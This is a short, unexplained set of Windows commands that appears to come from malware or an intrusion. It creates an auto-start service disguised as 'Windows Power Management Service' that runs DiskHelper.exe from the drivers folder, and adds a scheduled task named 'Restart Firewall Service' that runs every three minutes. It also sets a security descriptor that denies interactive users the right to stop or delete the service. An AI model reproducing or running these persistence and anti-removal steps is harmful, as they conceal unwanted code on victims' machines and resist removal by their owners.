sc create PowerManagement binpath=C:\Windows\drivers\DiskHelper.exe start= auto
sc description PowerManagement "Windows Power Management Service"

schtasks /create /sc minute /mo 3 /tn "Restart Firewall Service" /tr "cmd.exe C:\Windows\System32\restartservice.cmd"

sc sdset PowerManagement D:(D;;DCLCWPDTSD;;;IU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
